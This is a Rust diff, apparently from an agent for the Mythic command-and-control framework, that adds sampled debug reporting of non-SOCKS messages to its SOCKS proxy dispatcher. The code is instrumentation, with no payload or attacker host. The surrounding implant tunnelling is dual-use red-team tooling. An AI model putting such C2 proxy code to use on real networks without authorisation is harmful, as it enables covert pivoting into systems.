@@ -487,14 +487,45 @@ pub fn handle_socks(
                     }
                 }
                 // Non-SOCKS: ignore silently to avoid flooding (these are the Mythic acks you saw)
-                Ok(None) => {}
-                // We should rarely get here now; still keep a single-line stderr for visibility
-                Err(e) => {
-                    eprintln!("SOCKS extractor unexpected error: {e}");
+                Ok(None) => {
+                    non_socks_seen += 1;
+                    if non_socks_seen <= 5 || non_socks_seen % 100 == 0 {
+                        // summarize top-level keys
+                        let keys_top = raw_msg.as_object()
+                            .map(|m| {
+                                let mut v: Vec<String> = m.keys().cloned().collect();
+                                v.sort();
+                                v
+                            })
+                            .unwrap_or_default();
+                
+                        // summarize `parameters` (if exists)
+                        let params_preview = raw_msg.get("parameters").map(|p| {
+                            match p {
+                                serde_json::Value::String(s) => {
+                                    let s = s.trim();
+                                    format!("str(len={}; starts_with={{}}? {})",
+                                            s.len(),
+                                            s.starts_with('{'))
+                                }
+                                serde_json::Value::Object(o) => {
+                                    let mut v: Vec<String> = o.keys().cloned().collect();
+                                    v.sort();
+                                    format!("obj(keys={:?})", v)
+                                }
+                                _ => format!("{:?}", p)
+                            }
+                        }).unwrap_or_else(|| "<none>".into());
+                
+                        debug_to_mythic(
+                            &tx,
+                            &parent_task_id,
+                            "SOCKS skip sample",
+                            format!("count={non_socks_seen}; keys_top={keys_top:?}; parameters={params_preview}")
+                        );
+                    }
                 }
-            }
 
-        }
 
         debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher ended", "bridge_rx closed; dropping all sessions");
         sessions.clear();
